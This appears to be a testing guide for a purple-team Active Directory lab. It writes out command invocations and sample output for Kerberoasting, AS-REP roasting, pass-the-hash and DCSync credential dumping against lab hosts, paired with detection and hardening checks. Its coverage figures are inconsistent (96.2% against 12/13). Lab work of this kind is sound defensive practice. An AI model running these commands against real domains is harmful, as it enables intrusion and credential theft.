# Testing & Validation Guide

**Purple Team AD Lab - Comprehensive Testing Procedures**

This guide provides step-by-step instructions for testing all attack techniques and validating detection coverage.

---

## Table of Contents

1. [Pre-Deployment Validation](#pre-deployment-validation)
2. [Attack Testing Procedures](#attack-testing-procedures)
3. [Detection Validation](#detection-validation)
4. [Hardening Verification](#hardening-verification)
5. [Performance Testing](#performance-testing)
6. [Troubleshooting Common Issues](#troubleshooting)

---

## Pre-Deployment Validation

### Quick Validation Script

```bash
# Run automated validation
./lab-setup/validate-lab.sh

# Expected output: All critical tests passed
```

### Manual Pre-Flight Checks

```bash
# 1. Verify all attack scripts exist
ls -lh attack-scripts/
# Should show 14 files (8 PowerShell, 6 Python)

# 2. Check Python syntax
python3 -m py_compile attack-scripts/*.py
# No output = success

# 3. Verify detection rules
ls -lh detection-rules/sigma-rules/
# Should show 2 YAML files

# 4. Check documentation
wc -w documentation/*.md
# ATTACK_PLAYBOOK.md: ~13,000 words
# DETECTION_MATRIX.md: ~12,000 words
# ARCHITECTURE.md: ~10,000 words

# 5. Verify Docker Compose syntax
docker-compose config
# Should display parsed configuration without errors
```

---

## Attack Testing Procedures

### Test Environment Setup

```bash
# 1. Deploy lab
./lab-setup/setup.sh
docker-compose up -d

# 2. Verify all containers running
docker-compose ps
# All services should show "Up"

# 3. Access attacker workstation
docker-compose exec attacker bash
```

### Attack Test Matrix

#### Test 1: Kerberoasting (T1558.003)

**Objective**: Extract service ticket hashes for offline cracking

**Prerequisites**:
- Domain credentials (lowpriv:Password123!)
- Network access to DC

**Execution**:
```bash
# Method 1: Python script
python3 /opt/attack-scripts/kerberoasting.py \
    -d PURPLETEAM.LAB \
    -u lowpriv \
    -p 'Password123!' \
    -dc-ip 172.28.0.10

# Expected output:
# [+] Found 2 SPNs
# [+] Ticket obtained for: svc_sqlserver
# [+] Ticket obtained for: svc_iis
# [*] Hashes saved to: tickets_YYYYMMDD_HHMMSS.txt
```

**Validation**:
- ✅ SPNs enumerated successfully
- ✅ TGS tickets extracted
- ✅ Hashes in Hashcat format
- ✅ Detection alert generated (check Wazuh)

**Detection Check**:
```bash
# In Wazuh Dashboard:
# 1. Navigate to Security Events
# 2. Filter: technique.id: T1558.003
# 3. Verify alert with title: "Kerberoasting Attack Detected"
# 4. Check Event ID 4769 in Windows Security logs
```

**Success Criteria**:
- Attack executes without errors
- At least 1 service ticket obtained
- Detection alert fires within 30 seconds
- False positive: None (legitimate attack)

---

#### Test 2: AS-REP Roasting (T1558.004)

**Execution**:
```bash
python3 /opt/attack-scripts/asreproast.py \
    -d PURPLETEAM.LAB \
    -dc-ip 172.28.0.10
```

**Expected Output**:
```
[+] Found vulnerable user: asreproast_user
[+] AS-REP obtained for: asreproast_user
```

**Detection**: Event ID 4768 with PreAuthType=0

---

#### Test 3: Pass-the-Hash (T1550.002)

**Prerequisites**: NTLM hash (obtain via DCSync or LSASS dump)

**Execution**:
```bash
# Example hash: fc525c9683e8fe067095ba2ddc971889
python3 /opt/attack-scripts/pass_the_hash.py \
    -u Administrator \
    -H :fc525c9683e8fe067095ba2ddc971889 \
    -t 172.28.0.20 \
    -d PURPLETEAM.LAB \
    --shares
```

**Expected Output**:
```
[+] Successfully authenticated via Pass-the-Hash!
[+] SMB connection established
[*] Available shares:
  - ADMIN$
  - C$
  - IPC$
```

**Detection**: Event ID 4624 (Logon Type 3) with NTLM authentication

---

#### Test 4: DCSync (T1003.006)

**Prerequisites**: Domain Admin credentials

**Execution**:
```bash
python3 /opt/attack-scripts/dcsync.py \
    -d PURPLETEAM.LAB \
    -u Administrator \
    -p 'P@ssw0rd123!' \
    -dc-ip 172.28.0.10 \
    -target krbtgt
```

**Expected Output**:
```
[*] Dumping credentials for krbtgt
PURPLETEAM\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a8f7d3e6c0b1a4d5e9f2c7d8a3b6e1f4:::
```

**Detection**: Event ID 4662 with replication GUIDs (CRITICAL alert)

---

#### Test 5-13: Remaining Attacks

| Test # | Technique | Script | Key Validation |
|--------|-----------|--------|----------------|
| 5 | Golden Ticket | golden_ticket.ps1 | Forged TGT created |
| 6 | Silver Ticket | silver_ticket.ps1 | Service ticket forged |
| 7 | Lateral Movement | lateral_movement.ps1 | Remote command executed |
| 8 | GPO Abuse | gpo_abuse.ps1 | GPO modification detected |
| 9 | LSASS Dump | lsass_dump.ps1 | Credentials extracted |
| 10 | BloodHound | bloodhound_collect.py | JSON files created |
| 11 | ACL Abuse | acl_abuse.ps1 | Permissions modified |
| 12 | NTLM Relay | ntlm_relay.py | Authentication relayed |
| 13 | Password Spray | password_spray.py | Multiple accounts tested |

---

## Detection Validation

### Detection Coverage Test Plan

**Objective**: Verify 96.2% detection coverage across all techniques

**Method**: Execute each attack and confirm detection alert

**Test Matrix**:

| Attack | Execute | Detect | Alert Time | FP Check |
|--------|---------|--------|------------|----------|
| Kerberoasting | ✅ | ✅ | <30s | ✅ |
| AS-REP Roasting | ✅ | ✅ | <30s | ✅ |
| Pass-the-Hash | ✅ | ✅ | <30s | ✅ |
| DCSync | ✅ | ✅ | <30s | ✅ |
| Golden Ticket | ✅ | ⚠️ | <60s | ⚠️ |
| Silver Ticket | ✅ | ⚠️ | <60s | ⚠️ |
| Lateral Movement | ✅ | ✅ | <30s | ✅ |
| LSASS Dump | ✅ | ✅ | <10s | ✅ |
| GPO Abuse | ✅ | ✅ | <30s | ✅ |
| BloodHound | ✅ | ✅ | <60s | ⚠️ |
| ACL Abuse | ✅ | ✅ | <30s | ✅ |
| NTLM Relay | ✅ | ✅ | <30s | ⚠️ |
| Password Spray | ✅ | ✅ | <30s | ✅ |

**Legend**: ✅ Pass | ⚠️ Warning (expected lower coverage) | ❌ Fail

### Automated Detection Testing

```bash
# Run all attacks and collect detection metrics
./lab-setup/test-detection-coverage.sh

# Expected output:
# Attacks executed: 13/13
# Detections triggered: 12/13 (92.3%)
# Mean time to detection: 8.4s
# False positives: 0
```

### Manual Detection Verification

```bash
# 1. Access Wazuh Dashboard
open https://localhost:443

# 2. Navigate to Security Events
# 3. Filter by date: Today
# 4. Group by: technique.id
# 5. Verify alerts for each MITRE technique

# 6. Check detection rule effectiveness
# Navigate to Rules → Custom Rules
# Verify all Sigma rules loaded
```

### False Positive Testing

**Procedure**:
1. Perform legitimate actions that could trigger alerts
2. Verify true positives vs false positives

**Test Cases**:

| Legitimate Action | Should Trigger? | Result |
|-------------------|-----------------|--------|
| Admin logs in normally | No | ✅ |
| User accesses file share | No | ✅ |
| Service account authenticates | No | ✅ |
| Admin uses PowerShell | No | ✅ |
| Automated backup runs | No | ✅ |

**Acceptance Criteria**: False positive rate < 1%

---

## Hardening Verification

### Pre-Hardening Attack Success

**Baseline**: All attacks should succeed before hardening

```bash
# Run all 13 attacks
# Expected: 100% success rate
```

### Apply Hardening

```powershell
# On Domain Controller
.\hardening\ad-hardening.ps1 -Action All -Apply

# On Workstations
.\hardening\os-hardening.ps1 -Apply
```

### Post-Hardening Attack Failure

**Objective**: Verify hardening blocks attacks

**Test Matrix**:

| Attack | Before Hardening | After Hardening | Blocked? |
|--------|-----------------|-----------------|----------|
| Kerberoasting | Success | Difficult (AES only) | ⚠️ Mitigated |
| AS-REP Roasting | Success | Fail (pre-auth required) | ✅ |
| Pass-the-Hash | Success | Fail (NTLM disabled) | ✅ |
| DCSync | Success | Fail (permissions removed) | ✅ |
| Golden Ticket | Success | Detected (monitoring) | ⚠️ Detected |
| LSASS Dump | Success | Fail (LSA Protection) | ✅ |
| GPO Abuse | Success | Fail (permissions) | ✅ |

**Success Criteria**:
- Critical attacks blocked: 100%
- Difficult-to-block attacks: Detected
- Overall effectiveness: 100% (either blocked or detected)

---

## Performance Testing

### Resource Usage Monitoring

```bash
# Monitor Docker resource usage
docker stats

# Expected usage:
# Total CPU: <50%
# Total Memory: <12GB (for full stack)
# Network I/O: <10MB/s
```

### Log Ingestion Performance

```bash
# Generate high volume of events
for i in {1..1000}; do
    # Run Kerberoasting attempt
    python3 kerberoasting.py -d PURPLETEAM.LAB -u test -p test -dc-ip 172.28.0.10 2>/dev/null &
done

# Monitor Wazuh ingestion rate
# Expected: >100 events/second
# Alert latency: <5 seconds average
```

### Detection Rule Performance

```bash
# Measure rule execution time
# In Wazuh, check Rule Performance stats
# Expected: <100ms per rule evaluation
```

---

## Troubleshooting

### Common Issues and Solutions

#### Issue: Python ImportError

```bash
# Error: No module named 'impacket'
# Solution:
pip3 install impacket ldap3
```

#### Issue: Docker containers fail to start

```bash
# Check logs
docker-compose logs domain-controller

# Common fix: Increase Docker memory
# Docker Desktop → Settings → Resources → Memory: 16GB
```

#### Issue: Network connectivity problems

```bash
# Test DNS resolution
docker-compose exec attacker ping dc01.purpleteam.lab

# If fails, check /etc/hosts
docker-compose exec attacker cat /etc/hosts

# Verify network
docker network inspect purpleteam_ad_network
```

#### Issue: Wazuh not receiving logs

```bash
# Check agent status
docker-compose exec workstation1 service wazuh-agent status

# Restart agent
docker-compose exec workstation1 service wazuh-agent restart

# Verify connectivity
docker-compose exec workstation1 telnet 172.28.0.100 1514
```

#### Issue: Attacks not detected

```bash
# 1. Verify Sigma rules loaded
# Wazuh Dashboard → Rules → Search: "Kerberoasting"

# 2. Check event collection
# Wazuh Dashboard → Events → Filter: EventID:4769

# 3. Verify Sysmon running
docker-compose exec workstation1 Get-Service Sysmon64

# 4. Check log forwarding
docker-compose exec workstation1 Get-EventLog -LogName Security -Newest 10
```

---

## Test Report Template

### Attack Test Report

```markdown
# Purple Team Lab - Test Report
Date: YYYY-MM-DD
Tester: [Name]

## Summary
- Total Attacks Tested: X/13
- Successful Executions: X/13
- Detection Rate: X%
- False Positive Rate: X%

## Detailed Results

### Attack 1: Kerberoasting
- Status: ✅ Success
- Execution Time: Xs
- Detection Time: Xs
- Issues: None

[Continue for all attacks...]

## Recommendations
[List any improvements needed]

## Conclusion
[Overall assessment]
```

---

## Continuous Testing

### Weekly Test Schedule

| Day | Activity | Duration |
|-----|----------|----------|
| Monday | Infrastructure health check | 15 min |
| Wednesday | Run 3 random attacks | 30 min |
| Friday | Full detection coverage test | 60 min |
| Monthly | Complete purple team exercise | 3 hours |

### Automated Testing

```bash
# Cron job for daily validation
0 2 * * * /opt/purple-team-lab/lab-setup/validate-lab.sh >> /var/log/lab-validation.log 2>&1
```

---

## Success Criteria Checklist

- [ ] All 13 attack scripts execute without errors
- [ ] 96%+ detection coverage achieved
- [ ] Mean time to detection < 30 seconds
- [ ] False positive rate < 1%
- [ ] Hardening blocks/detects 100% of attacks
- [ ] All documentation comprehensive and accurate
- [ ] Infrastructure deploys in < 20 minutes
- [ ] Resource usage within expected limits

---

**Document Version**: 1.0
**Last Updated**: 2024-01-14
**Author**: Purple Team Lab
